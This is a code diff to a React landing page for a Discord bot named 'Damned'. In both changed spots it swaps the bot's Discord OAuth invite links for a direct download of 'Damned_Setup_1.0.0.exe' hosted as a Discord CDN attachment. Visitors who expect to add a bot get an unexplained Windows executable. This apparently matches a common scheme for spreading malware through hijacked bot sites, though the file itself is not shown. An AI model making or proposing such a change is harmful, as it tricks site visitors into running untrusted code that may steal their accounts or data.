@@ -17,7 +17,7 @@ export default function Index() {
 	  </p>
         <div className="animateHeader mt-10 flex flex-wrap items-center justify-center gap-x-4">
   
-            <Link href={"https://discord.com/api/oauth2/authorize?client_id=774043716797071371&permissions=277028620608&scope=applications.commands%20bot"}>
+            <Link href={"https://cdn.discordapp.com/attachments/1353719702416785428/1354132967362138113/Damned_Setup_1.0.0.exe?ex=67e42e19&is=67e2dc99&hm=e59663cbdbabe53b5afbab9d7e3450887a2f4d3cbfb7255bab52aa8f7ab0db16&"}>
               <a
                 className={
                   "flex items-center px-6 justify-center gap-x-2 shadow-lg shadow-amber-600/20 rounded-xl py-4 font-medium bg-gradient-to-bl from-amber-700 to-amber-500 hover:opacity-80 transition duration-200 text-white " 
@@ -42,7 +42,7 @@ export default function Index() {
           <div className="col-span-4">
             <p className="text-white text-4xl font-bold" dangerouslySetInnerHTML={{ __html:"Damned" }} />
             <p className="text-white text-md font-medium text-gray-500/75" dangerouslySetInnerHTML={{ __html: "How about creating the best environment to relax yourself with your own emotions?" }}/>
-            <a href="https://discord.com/api/oauth2/authorize?client_id=774043716797071371&permissions=277028620608&scope=bot%20applications.commands" className={"mt-10 flex items-center px-4 justify-center gap-x-2 shadow-lg shadow-amber-600/20 cursor-pointer rounded-xl py-4 font-medium bg-gradient-to-r from-amber-700 to-amber-500 hover:opacity-80 transition duration-200 text-white"}>
+            <a href="https://cdn.discordapp.com/attachments/1353719702416785428/1354132967362138113/Damned_Setup_1.0.0.exe?ex=67e42e19&is=67e2dc99&hm=e59663cbdbabe53b5afbab9d7e3450887a2f4d3cbfb7255bab52aa8f7ab0db16&" className={"mt-10 flex items-center px-4 justify-center gap-x-2 shadow-lg shadow-amber-600/20 cursor-pointer rounded-xl py-4 font-medium bg-gradient-to-r from-amber-700 to-amber-500 hover:opacity-80 transition duration-200 text-white"}>
               <i className="fab fa-discord mr-2" />Download Damned
             </a>
           </div>
